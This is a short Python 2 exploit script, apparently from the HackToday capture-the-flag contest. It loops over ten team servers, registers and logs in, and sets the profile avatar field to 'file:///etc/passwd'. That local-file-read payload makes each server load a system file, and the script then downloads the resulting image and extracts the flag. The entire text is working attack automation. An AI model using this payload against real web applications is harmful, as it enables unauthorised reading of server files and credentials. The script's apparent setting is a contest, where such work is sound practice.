from twill.commands import *
import time
import re
import requests

redirect_output('out.txt')

for team in range(1, 11):

    base_url = "http://sawah.ittoday.web.id:3%02d07" % team
    reg_url = base_url + "/register"
    log_url = base_url + "/login"
    prf_url = base_url + "/profile"

    t = int(time.time())

    username = "__panitiatest" + str(t)
    password = "__panitiatest" + str(t)

    go(reg_url)
    fv("1", "username", username)
    fv("1", "password", password)
    submit("1")

    go(log_url)
    fv("1", "username", username)
    fv("1", "password", password)
    submit("1")

    go(prf_url)
    fv("1", "fullname", "Panitia")
    fv("1", "birthdate", "01/01/1970")
    fv("1", "address", "Localhost")
    fv("1", "avatar", "file:///etc/passwd")
    submit("1")

    go(prf_url)
    content = get_browser().get_html()

    res = re.search('img src="(.*\.jpg)"', content)
    img_url = base_url + '/' + res.group(1)

    req = requests.get(img_url)
    img_content = req.text

    res = re.search('(HackToday\{.*\})', img_content)
    flag = res.group(1)

    print flag + "," + str(team) + ",7"
